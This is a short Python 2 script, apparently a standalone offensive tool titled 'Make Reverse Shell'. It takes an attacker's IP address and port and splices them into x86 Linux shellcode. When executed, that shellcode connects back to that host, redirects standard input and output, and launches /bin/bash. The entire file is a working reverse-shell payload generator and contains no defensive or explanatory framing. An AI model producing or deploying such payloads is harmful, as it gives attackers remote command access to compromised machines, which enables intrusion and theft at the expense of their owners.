#!/usr/bin/python
# Title: Make Reverse Shell
# Author: Wi1d5a1m0N

#imports section
import sys
import socket

if len(sys.argv) != 3:
	print "Usage: " + sys.argv[0] + " [IP] [Port#]\n"
	print "You need to a valid ip and port. Try again."
	sys.exit()

ip = socket.inet_aton(sys.argv[1]).encode('hex')
ip = "\\x" + str(ip[0:2]) + "\\x" + str(ip[2:4]) + "\\x" + str(ip[4:6]) + "\\x" + str(ip[6:8])

port = int(sys.argv[2])
port = format(port, '04x')
port = "\\x" + str(port[2:4]) + "\\x" + str(port[0:2])

shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb3\\x01\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x43\\x68" + ip + "\\x66\\x68" + port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x89\\xf3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x31\\xd2\\x52\\x68\\x62\\x61\\x73\\x68\\x68\\x2f\\x2f\\x2f\\x2f\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80"
print "Reverse TCP Shellcode:\n"
print shellcode
